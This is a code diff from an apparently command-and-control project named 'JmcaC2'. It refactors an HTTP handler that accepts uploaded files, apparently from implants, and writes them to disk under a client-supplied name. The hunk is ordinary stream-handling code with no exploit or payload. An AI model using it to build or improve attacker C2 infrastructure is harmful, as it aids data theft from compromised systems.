@@ -300,20 +300,15 @@ namespace JmcaC2
                             Console.WriteLine($"[+] File: {fileName}");
                             Console.WriteLine($"[+] Bytes: {fileLength}");
 
-                            byte[] buffer = new byte[fileLength];
 
-                            using (var input = context.Request.InputStream)
+                            byte[] bytes = null;
+                            using (var memoryStream = new MemoryStream())
                             {
-                                int read = 0;
-                                while (read < fileLength)
-                                {
-                                    int n = input.Read(buffer, read, (int)(fileLength - read));
-                                    if (n == 0) break;
-                                    read += n;
-                                }
+                                context.Request.InputStream.CopyTo(memoryStream);
+                                bytes = memoryStream.ToArray();
                             }
 
-                            File.WriteAllBytes(fileName, buffer);
+                            File.WriteAllBytes(fileName, bytes);
 
                         }
                         else
